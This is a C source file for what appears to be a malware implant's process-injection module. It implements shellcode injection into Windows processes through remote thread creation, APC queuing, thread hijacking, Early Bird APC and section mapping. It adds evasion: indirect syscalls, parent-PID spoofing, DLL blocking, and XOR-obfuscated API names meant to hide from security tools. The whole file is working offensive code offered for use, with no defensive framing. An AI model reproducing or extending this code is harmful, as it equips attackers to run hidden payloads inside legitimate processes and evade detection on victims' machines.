/*
 * inject.c — Process injection kit implementation.
 *
 * All techniques use indirect syscalls when CONFIG_INDIRECT_SYSCALLS is set,
 * falling back to direct ntdll calls otherwise.
 */
#include "agent.h"
#include "inject.h"
#include "evasion.h"
#include "syscalls.h"
#include "syscalls_wrappers.h"
#include "api_resolve.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

/* ─── Helpers ─── */

static void _set_error(INJECT_RESULT *r, const char *msg, DWORD code) {
    if (!r) return;
    r->success = FALSE;
    r->lastError = code;
    strncpy(r->errorMsg, msg, sizeof(r->errorMsg) - 1);
    r->errorMsg[sizeof(r->errorMsg) - 1] = '\0';
}

static HANDLE _open_process(DWORD pid, INJECT_RESULT *result) {
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) {
        _set_error(result, "OpenProcess failed", GetLastError());
        return NULL;
    }
    return hProc;
}

/*
 * Allocate + write + protect in target process.
 * Uses indirect syscalls if available.
 */
static BOOL _write_payload(HANDLE hProc, const unsigned char *payload,
                           SIZE_T payloadLen, void **remoteBase,
                           INJECT_RESULT *result) {
    *remoteBase = NULL;
    NTSTATUS status;
    SIZE_T regionSize = payloadLen;

    /* Allocate RW (not RWX — we flip to RX after writing) */
#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtAllocateVirtualMemory(
        hProc, remoteBase, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtAllocateVirtualMemory failed", (DWORD)status);
        return FALSE;
    }
#else
    *remoteBase = VirtualAllocEx(hProc, NULL, payloadLen,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*remoteBase) {
        _set_error(result, "VirtualAllocEx failed", GetLastError());
        return FALSE;
    }
#endif

    /* Write payload */
    SIZE_T written = 0;
#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtWriteVirtualMemory(hProc, *remoteBase,
                                      (PVOID)payload, payloadLen, &written);
    if (!NT_SUCCESS(status) || written != payloadLen) {
        _set_error(result, "NtWriteVirtualMemory failed", (DWORD)status);
        return FALSE;
    }
#else
    if (!WriteProcessMemory(hProc, *remoteBase, payload, payloadLen, &written) ||
        written != payloadLen) {
        _set_error(result, "WriteProcessMemory failed", GetLastError());
        return FALSE;
    }
#endif

    /* Flip RW → RX (no RWX ever!) */
    ULONG oldProt = 0;
    SIZE_T protSize = payloadLen;
    void *protBase = *remoteBase;
#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtProtectVirtualMemory(hProc, &protBase, &protSize,
                                        PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtProtectVirtualMemory RX failed", (DWORD)status);
        return FALSE;
    }
#else
    DWORD oldProtDw = 0;
    if (!VirtualProtectEx(hProc, *remoteBase, payloadLen,
                          PAGE_EXECUTE_READ, &oldProtDw)) {
        _set_error(result, "VirtualProtectEx RX failed", GetLastError());
        return FALSE;
    }
#endif

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  TECHNIQUE 1: NtCreateThreadEx
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _inject_createthread(HANDLE hProc, void *remoteBase,
                                  INJECT_OPTS *opts, INJECT_RESULT *result) {
    HANDLE hThread = NULL;

#if CONFIG_INDIRECT_SYSCALLS
    NTSTATUS status = Sw_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProc,
        remoteBase,    /* StartRoutine */
        NULL,          /* Argument */
        0,             /* CreateFlags (0 = run immediately) */
        0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtCreateThreadEx failed", (DWORD)status);
        return FALSE;
    }
#else
    hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);
    if (!hThread) {
        _set_error(result, "CreateRemoteThread failed", GetLastError());
        return FALSE;
    }
#endif

    result->hThread = hThread;

    if (opts->waitForCompletion) {
        WaitForSingleObject(hThread, opts->timeoutMs ? opts->timeoutMs : INFINITE);
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  TECHNIQUE 2: QueueUserAPC
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Find an alertable thread in the target process.
 * Returns thread handle or NULL. Caller must close.
 */
static HANDLE _find_alertable_thread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    HANDLE hThread = NULL;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(
                    THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                    FALSE, te.th32ThreadID);
                if (hThread) break;  /* Take the first available thread */
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return hThread;
}

static BOOL _inject_apc(HANDLE hProc, void *remoteBase,
                         INJECT_OPTS *opts, INJECT_RESULT *result) {
    /* Find a thread to queue APC to */
    HANDLE hThread = opts->hThread;
    BOOL ownedThread = FALSE;

    if (!hThread) {
        hThread = _find_alertable_thread(opts->targetPid);
        if (!hThread) {
            _set_error(result, "No suitable thread found for APC", 0);
            return FALSE;
        }
        ownedThread = TRUE;
    }

#if CONFIG_INDIRECT_SYSCALLS
    NTSTATUS status = Sw_NtQueueApcThread(hThread, remoteBase, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtQueueApcThread failed", (DWORD)status);
        if (ownedThread) CloseHandle(hThread);
        return FALSE;
    }
#else
    DWORD qResult = QueueUserAPC((PAPCFUNC)remoteBase, hThread, 0);
    if (qResult == 0) {
        _set_error(result, "QueueUserAPC failed", GetLastError());
        if (ownedThread) CloseHandle(hThread);
        return FALSE;
    }
#endif

    result->hThread = hThread;

    if (opts->waitForCompletion) {
        WaitForSingleObject(hThread, opts->timeoutMs ? opts->timeoutMs : INFINITE);
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  TECHNIQUE 3: Thread Hijack
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _inject_thread_hijack(HANDLE hProc, void *remoteBase,
                                   INJECT_OPTS *opts, INJECT_RESULT *result) {
    HANDLE hThread = opts->hThread;
    BOOL ownedThread = FALSE;

    if (!hThread) {
        hThread = _find_alertable_thread(opts->targetPid);
        if (!hThread) {
            _set_error(result, "No thread found for hijack", 0);
            return FALSE;
        }
        ownedThread = TRUE;
    }

    /* Suspend target thread */
    DWORD suspCount = SuspendThread(hThread);
    if (suspCount == (DWORD)-1) {
        _set_error(result, "SuspendThread failed", GetLastError());
        if (ownedThread) CloseHandle(hThread);
        return FALSE;
    }

    /* Get thread context */
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

#if CONFIG_INDIRECT_SYSCALLS
    NTSTATUS status = Sw_NtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtGetContextThread failed", (DWORD)status);
        ResumeThread(hThread);
        if (ownedThread) CloseHandle(hThread);
        return FALSE;
    }
#else
    if (!GetThreadContext(hThread, &ctx)) {
        _set_error(result, "GetThreadContext failed", GetLastError());
        ResumeThread(hThread);
        if (ownedThread) CloseHandle(hThread);
        return FALSE;
    }
#endif

    /* Save original RIP, redirect to our payload */
#if defined(__x86_64__) || defined(_M_X64)
    /*
     * We need to write a small stub that:
     *   1. Pushes the original RIP onto the stack
     *   2. Jumps to our payload
     *   3. Payload returns → pops original RIP → execution continues
     *
     * For simplicity, we just set RIP to payload. The payload must
     * be designed to restore execution (or this is fire-and-forget).
     */
    ctx.Rip = (DWORD64)(uintptr_t)remoteBase;
#else
    ctx.Eip = (DWORD)(uintptr_t)remoteBase;
#endif

    /* Set modified context */
#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtSetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtSetContextThread failed", (DWORD)status);
        ResumeThread(hThread);
        if (ownedThread) CloseHandle(hThread);
        return FALSE;
    }
#else
    if (!SetThreadContext(hThread, &ctx)) {
        _set_error(result, "SetThreadContext failed", GetLastError());
        ResumeThread(hThread);
        if (ownedThread) CloseHandle(hThread);
        return FALSE;
    }
#endif

    /* Resume thread — it now executes our payload */
    ResumeThread(hThread);
    result->hThread = hThread;

    if (opts->waitForCompletion) {
        WaitForSingleObject(hThread, opts->timeoutMs ? opts->timeoutMs : INFINITE);
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  TECHNIQUE 4: Early Bird APC
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _inject_early_bird(const unsigned char *payload, SIZE_T payloadLen,
                                INJECT_OPTS *opts, INJECT_RESULT *result) {
    const wchar_t *spawnTo = opts->spawnTo ? opts->spawnTo : INJECT_DEFAULT_SPAWNTOP;
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    BOOL created = FALSE;

    /* Create suspended process with evasion attributes */
    if (opts->ppidSpoof && opts->spoofPid) {
        created = evasion_create_process_ppid_spoof(
            spawnTo, opts->spoofPid, opts->blockDlls, &pi);
    } else if (opts->blockDlls) {
        created = evasion_create_process_blockdlls(spawnTo, &pi);
    } else {
        STARTUPINFOW si;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        wchar_t cmdBuf[MAX_PATH];
        wcsncpy(cmdBuf, spawnTo, MAX_PATH - 1);
        cmdBuf[MAX_PATH - 1] = L'\0';
        created = CreateProcessW(NULL, cmdBuf, NULL, NULL, FALSE,
                                  CREATE_SUSPENDED | CREATE_NO_WINDOW,
                                  NULL, NULL, &si, &pi);
    }

    if (!created) {
        _set_error(result, "Failed to create suspended process", GetLastError());
        return FALSE;
    }

    result->hProcess = pi.hProcess;
    result->hThread = pi.hThread;

    /* Write payload into the child process */
    void *remoteBase = NULL;
    if (!_write_payload(pi.hProcess, payload, payloadLen, &remoteBase, result)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    result->remoteBase = remoteBase;

    /* Queue APC to the main thread BEFORE it starts */
#if CONFIG_INDIRECT_SYSCALLS
    NTSTATUS status = Sw_NtQueueApcThread(pi.hThread, remoteBase, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtQueueApcThread (early bird) failed", (DWORD)status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
#else
    if (QueueUserAPC((PAPCFUNC)remoteBase, pi.hThread, 0) == 0) {
        _set_error(result, "QueueUserAPC (early bird) failed", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
#endif

    /* Resume — APC fires before main thread entry point */
    ResumeThread(pi.hThread);

    if (opts->waitForCompletion) {
        WaitForSingleObject(pi.hProcess,
                            opts->timeoutMs ? opts->timeoutMs : INFINITE);
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  TECHNIQUE 5: Section Mapping
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
                                 SIZE_T payloadLen, INJECT_OPTS *opts,
                                 INJECT_RESULT *result) {
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = (LONGLONG)payloadLen;
    NTSTATUS status;

    /* Create section with RWX (we control both views) */
#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                 &sectionSize, PAGE_EXECUTE_READWRITE,
                                 SEC_COMMIT, NULL);
#else
    typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID,
        PLARGE_INTEGER, ULONG, ULONG, HANDLE);
    char _sn1[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sn1[_i];_i++) _sn1[_i]^=0x5A;
    char _sf1[] = {'N'^0x5A,'t'^0x5A,'C'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
    for(int _i=0;_sf1[_i];_i++) _sf1[_i]^=0x5A;
    pNtCreateSection NtCS = (pNtCreateSection)GetProcAddress(
        GetModuleHandleA(_sn1), _sf1);
    SecureZeroMemory(_sn1, sizeof(_sn1));
    SecureZeroMemory(_sf1, sizeof(_sf1));
    if (!NtCS) {
        _set_error(result, "Cannot resolve NtCreateSection", 0);
        return FALSE;
    }
    status = NtCS(&hSection, SECTION_ALL_ACCESS, NULL,
                  &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
#endif

    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtCreateSection failed", (DWORD)status);
        return FALSE;
    }

    /* Map RW view into our process (for writing) */
    void *localBase = NULL;
    SIZE_T viewSize = 0;

#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtMapViewOfSection(hSection, GetCurrentProcess(),
        &localBase, 0, payloadLen, NULL, &viewSize, 1 /* ViewShare */,
        0, PAGE_READWRITE);
#else
    typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*,
        ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
    char _sn2[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sn2[_i];_i++) _sn2[_i]^=0x5A;
    char _sf2[] = {'N'^0x5A,'t'^0x5A,'M'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
    for(int _i=0;_sf2[_i];_i++) _sf2[_i]^=0x5A;
    pNtMapViewOfSection NtMVS = (pNtMapViewOfSection)GetProcAddress(
        GetModuleHandleA(_sn2), _sf2);
    SecureZeroMemory(_sn2, sizeof(_sn2));
    SecureZeroMemory(_sf2, sizeof(_sf2));
    if (!NtMVS) {
        CloseHandle(hSection);
        _set_error(result, "Cannot resolve NtMapViewOfSection", 0);
        return FALSE;
    }
    status = NtMVS(hSection, GetCurrentProcess(), &localBase, 0,
                   payloadLen, NULL, &viewSize, 1, 0, PAGE_READWRITE);
#endif

    if (!NT_SUCCESS(status)) {
        CloseHandle(hSection);
        _set_error(result, "NtMapViewOfSection (local) failed", (DWORD)status);
        return FALSE;
    }

    /* Write payload to local view */
    memcpy(localBase, payload, payloadLen);

    /* Map RX view into target process */
    void *remoteBase = NULL;
    viewSize = 0;

#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtMapViewOfSection(hSection, hProc, &remoteBase, 0,
        payloadLen, NULL, &viewSize, 1, 0, PAGE_EXECUTE_READ);
#else
    status = NtMVS(hSection, hProc, &remoteBase, 0, payloadLen,
                   NULL, &viewSize, 1, 0, PAGE_EXECUTE_READ);
#endif

    /* Unmap local view — we're done writing */
#if CONFIG_INDIRECT_SYSCALLS
    Sw_NtUnmapViewOfSection(GetCurrentProcess(), localBase);
#else
    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
    char _sn3[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sn3[_i];_i++) _sn3[_i]^=0x5A;
    char _sf3[] = {'N'^0x5A,'t'^0x5A,'U'^0x5A,'n'^0x5A,'m'^0x5A,'a'^0x5A,'p'^0x5A,'V'^0x5A,'i'^0x5A,'e'^0x5A,'w'^0x5A,'O'^0x5A,'f'^0x5A,'S'^0x5A,'e'^0x5A,'c'^0x5A,'t'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,0};
    for(int _i=0;_sf3[_i];_i++) _sf3[_i]^=0x5A;
    pNtUnmapViewOfSection NtUVS = (pNtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA(_sn3), _sf3);
    SecureZeroMemory(_sn3, sizeof(_sn3));
    SecureZeroMemory(_sf3, sizeof(_sf3));
    if (NtUVS) NtUVS(GetCurrentProcess(), localBase);
#endif

    CloseHandle(hSection);

    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtMapViewOfSection (remote) failed", (DWORD)status);
        return FALSE;
    }

    result->remoteBase = remoteBase;

    /* Create thread at remote base */
    HANDLE hThread = NULL;
#if CONFIG_INDIRECT_SYSCALLS
    status = Sw_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
        hProc, remoteBase, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        _set_error(result, "NtCreateThreadEx (section) failed", (DWORD)status);
        return FALSE;
    }
#else
    hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);
    if (!hThread) {
        _set_error(result, "CreateRemoteThread (section) failed", GetLastError());
        return FALSE;
    }
#endif

    result->hThread = hThread;

    if (opts->waitForCompletion) {
        WaitForSingleObject(hThread, opts->timeoutMs ? opts->timeoutMs : INFINITE);
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  PUBLIC API
 * ═══════════════════════════════════════════════════════════════════ */

BOOL inject_shellcode(const unsigned char *payload, SIZE_T payloadLen,
                       INJECT_OPTS *opts, INJECT_RESULT *result) {
    if (!payload || payloadLen == 0 || !opts || !result) {
        if (result) _set_error(result, "Invalid arguments", ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    memset(result, 0, sizeof(*result));

    /* Early Bird is self-contained (creates its own process) */
    if (opts->technique == INJECT_EARLY_BIRD) {
        result->success = _inject_early_bird(payload, payloadLen, opts, result);
        return result->success;
    }

    /* All other techniques need a target process handle */
    HANDLE hProc = opts->hProcess;
    BOOL ownedProc = FALSE;

    if (!hProc) {
        if (opts->targetPid == 0) {
            hProc = GetCurrentProcess();
        } else {
            hProc = _open_process(opts->targetPid, result);
            if (!hProc) return FALSE;
            ownedProc = TRUE;
        }
    }

    result->hProcess = hProc;

    /* Section mapping handles its own memory allocation differently */
    if (opts->technique == INJECT_SECTION_MAP) {
        result->success = _inject_section_map(hProc, payload, payloadLen, opts, result);
        if (!result->success && ownedProc) CloseHandle(hProc);
        return result->success;
    }

    /* Standard flow: allocate → write → protect → execute */
    void *remoteBase = NULL;
    if (!_write_payload(hProc, payload, payloadLen, &remoteBase, result)) {
        if (ownedProc) CloseHandle(hProc);
        return FALSE;
    }
    result->remoteBase = remoteBase;

    BOOL injected = FALSE;
    switch (opts->technique) {
        case INJECT_CREATETHREAD:
            injected = _inject_createthread(hProc, remoteBase, opts, result);
            break;
        case INJECT_APC_QUEUE:
            injected = _inject_apc(hProc, remoteBase, opts, result);
            break;
        case INJECT_THREAD_HIJACK:
            injected = _inject_thread_hijack(hProc, remoteBase, opts, result);
            break;
        default:
            _set_error(result, "Unknown injection technique", 0);
            break;
    }

    if (!injected && ownedProc) {
        CloseHandle(hProc);
        result->hProcess = NULL;
    }

    result->success = injected;
    return injected;
}

BOOL inject_and_forget(const unsigned char *payload, SIZE_T payloadLen,
                        INJECT_OPTS *opts) {
    INJECT_RESULT result;
    memset(&result, 0, sizeof(result));

    BOOL ok = inject_shellcode(payload, payloadLen, opts, &result);

    /* Cleanup handles */
    if (result.hThread) CloseHandle(result.hThread);
    if (result.hProcess && result.hProcess != GetCurrentProcess())
        CloseHandle(result.hProcess);

    return ok;
}
